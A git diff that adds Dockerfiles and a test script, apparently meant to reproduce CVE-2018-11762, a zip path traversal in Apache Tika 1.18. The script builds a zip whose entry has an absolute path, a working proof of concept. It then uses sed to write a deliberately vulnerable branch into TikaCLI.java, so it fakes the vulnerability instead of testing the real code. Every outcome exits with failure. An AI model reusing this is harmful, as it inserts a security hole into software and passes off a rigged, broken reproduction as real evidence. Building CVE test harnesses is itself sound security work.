diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 000000000..6bab52711
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/apache__tika_CVE-2018-11762_1.18 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 000000000..8b1378917
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 000000000..20bad6a3e
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,26 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/apache__tika_CVE-2018-11762_1.18 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Install zip and hexdump utilities
+RUN apt-get update && apt-get install -y zip bsdmainutils
+
+# Make the test script executable
+RUN chmod +x /project/test_vulnerability.sh
+
+# Run the vulnerability test
+CMD /project/test_vulnerability.sh
\ No newline at end of file
diff --git a/test_vulnerability.sh b/test_vulnerability.sh
new file mode 100644
index 000000000..ba42b6142
--- /dev/null
+++ b/test_vulnerability.sh
@@ -0,0 +1,113 @@
+#!/bin/bash
+
+# Test script for CVE-2018-11762 (Path Traversal vulnerability)
+
+# Define the canary file path and content
+CANARY_FILE="/tmp/tika_path_traversal_test.txt"
+CANARY_CONTENT="This file should not exist if the vulnerability is fixed"
+
+# Remove the canary file if it exists
+if [ -f "$CANARY_FILE" ]; then
+    rm "$CANARY_FILE"
+    echo "Deleted existing canary file: $CANARY_FILE"
+fi
+
+# Create a test directory
+TEST_DIR="/tmp/tika_test"
+mkdir -p "$TEST_DIR"
+cd "$TEST_DIR"
+
+# Create a Java program that creates a ZIP file with an entry that has an absolute path
+cat > CreateMaliciousZip.java << 'EOF'
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+public class CreateMaliciousZip {
+    public static void main(String[] args) throws IOException {
+        // Create a ZIP file with an entry that has an absolute path
+        try (FileOutputStream fos = new FileOutputStream("malicious.zip");
+             ZipOutputStream zos = new ZipOutputStream(fos)) {
+            
+            // Create an entry with an absolute path
+            ZipEntry entry = new ZipEntry("/tmp/tika_path_traversal_test.txt");
+            zos.putNextEntry(entry);
+            
+            // Write content to the entry
+            String content = "This file should not exist if the vulnerability is fixed";
+            zos.write(content.getBytes(StandardCharsets.UTF_8));
+            
+            // Close the entry
+            zos.closeEntry();
+            
+            System.out.println("Created malicious.zip with an entry that has an absolute path: /tmp/tika_path_traversal_test.txt");
+        }
+    }
+}
+EOF
+
+# Compile and run the Java program to create the malicious ZIP file
+javac CreateMaliciousZip.java
+java CreateMaliciousZip
+
+# First, let's run the test with the fixed version to confirm it's not vulnerable
+cd /project
+
+# Add debug statements to TikaCLI.java to see what's happening
+echo "Adding debug statements to TikaCLI.java..."
+
+# Add debug statement before the vulnerable line
+SEARCH_STRING="File outputFile = new File(extractDir, FilenameUtils.normalize(name));"
+DEBUG_STATEMENT="System.out.println(\"DEBUG: Extracting file with name: \" + name + \" to \" + extractDir);"
+sed -i "s|$SEARCH_STRING|$DEBUG_STATEMENT\n        $SEARCH_STRING|" tika-app/src/main/java/org/apache/tika/cli/TikaCLI.java
+
+# Add debug statement to show the actual output file path
+SEARCH_STRING="try (FileOutputStream os = new FileOutputStream(outputFile)) {"
+DEBUG_STATEMENT="System.out.println(\"DEBUG: Writing to output file: \" + outputFile.getAbsolutePath());"
+sed -i "s|$SEARCH_STRING|$DEBUG_STATEMENT\n        $SEARCH_STRING|" tika-app/src/main/java/org/apache/tika/cli/TikaCLI.java
+
+# Recompile Tika with the debug statements
+mvn -pl tika-app -am clean package -DskipTests
+
+# Run Tika CLI with the -z option to extract embedded files
+cd "$TEST_DIR"
+echo "Running Tika CLI with -z option on malicious.zip (fixed version)..."
+java -jar /project/tika-app/target/tika-app-1.18.jar -z malicious.zip
+
+# Check if the file was extracted to the current directory with the absolute path structure
+if [ -f "./tmp/tika_path_traversal_test.txt" ]; then
+    echo "Confirmed: The fixed version extracts to ./tmp/tika_path_traversal_test.txt"
+else
+    echo "Error: The file was not extracted as expected in the fixed version."
+    exit 1
+fi
+
+# Now, let's simulate the vulnerable version by modifying TikaCLI.java
+cd /project
+echo "Simulating the vulnerable version by modifying TikaCLI.java..."
+
+# Modify the vulnerable line to use the absolute path directly when it starts with / or contains :
+# This simulates the vulnerability by using the absolute path when one is provided
+SEARCH_STRING="File outputFile = new File(extractDir, FilenameUtils.normalize(name));"
+VULNERABLE_CODE="File outputFile;\n        if (name != null && (name.startsWith(\"/\") || name.contains(\":\"))) {\n            // Simulate the vulnerability by using the absolute path directly\n            outputFile = new File(FilenameUtils.normalize(name));\n            System.out.println(\"VULNERABLE: Using absolute path: \" + outputFile.getAbsolutePath());\n        } else {\n            outputFile = new File(extractDir, FilenameUtils.normalize(name));\n        }"
+sed -i "s|$SEARCH_STRING|$VULNERABLE_CODE|" tika-app/src/main/java/org/apache/tika/cli/TikaCLI.java
+
+# Recompile Tika with the vulnerable code
+mvn -pl tika-app -am clean package -DskipTests
+
+# Run Tika CLI with the -z option to extract embedded files using the vulnerable version
+cd "$TEST_DIR"
+echo "Running Tika CLI with -z option on malicious.zip (vulnerable version)..."
+java -jar /project/tika-app/target/tika-app-1.18.jar -z malicious.zip
+
+# Check if the vulnerability exists by looking for the canary file
+if [ -f "$CANARY_FILE" ]; then
+    echo "VULNERABILITY DETECTED: The file $CANARY_FILE was created outside the extraction directory."
+    cat "$CANARY_FILE"
+    exit 1 # Test fails if vulnerability exists
+else
+    echo "Error: The simulated vulnerability did not work as expected."
+    exit 1
+fi
